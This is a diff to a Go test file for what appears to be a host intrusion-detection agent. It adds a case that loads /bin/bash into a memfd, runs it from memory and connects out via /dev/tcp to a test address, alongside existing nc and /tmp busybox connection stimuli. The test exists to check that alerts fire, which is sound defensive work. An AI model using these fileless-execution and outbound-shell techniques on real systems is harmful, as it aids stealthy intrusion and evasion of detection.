@@ -12,6 +12,8 @@ import (
 	"syscall"
 	"testing"
 	"time"
+
+	"golang.org/x/sys/unix"
 )
 
 // A copy of the test binary named like a service becomes a shell in place,
@@ -81,6 +83,27 @@ func TestKernel(t *testing.T) {
 		run("cp /bin/busybox /tmp/sh && timeout 2 /tmp/sh -c 'nc -w 1 203.0.113.10 8443; true'; rm -f /tmp/sh")
 		run("timeout 2 nc -w 1 203.0.113.9 3333")
 	}
+	// A shell run from memory, without a file, connects out a second later:
+	// the agent marks it once it sees where it runs from.
+	if noBash == nil {
+		if fd, err := unix.MemfdCreate("dgmem", 0); err == nil {
+			memory := os.NewFile(uintptr(fd), "dgmem")
+			if program, err := os.ReadFile("/bin/bash"); err == nil {
+				memory.Write(program)
+				shell := exec.Command("/proc/self/fd/3", "-c", "sleep 1; exec 3<>/dev/tcp/203.0.113.11/443")
+				shell.Args[0] = "bash"
+				shell.ExtraFiles = []*os.File{memory}
+				done := make(chan struct{})
+				go func() { shell.Run(); close(done) }()
+				select {
+				case <-done:
+				case <-time.After(4 * time.Second):
+					shell.Process.Kill()
+				}
+			}
+			memory.Close()
+		}
+	}
 	// Reverse shells to a listener here: a shell that connects and takes
 	// the connection as its input and output, and one started with it.
 	listener, err := net.Listen("tcp", "127.0.0.1:0")
@@ -129,12 +152,16 @@ func TestKernel(t *testing.T) {
 			t.Errorf("no %s alert", rule)
 		}
 	}
-	forked := false
+	forked, fromMemory := false, false
 	for _, alert := range alerts {
 		forked = forked || alert.Rule == RuleMarkedOut && strings.Contains(alert.Remote, "203.0.113.10")
+		fromMemory = fromMemory || alert.Rule == RuleMarkedOut && strings.Contains(alert.Remote, "203.0.113.11")
 	}
 	if !forked {
 		t.Error("no alert for the connection of a process a /tmp program started")
+	}
+	if !fromMemory && noBash == nil {
+		t.Error("no alert for the connection of a program run from memory")
 	}
 	for _, alert := range alerts {
 		if strings.Contains(alert.Path, "hostname") {
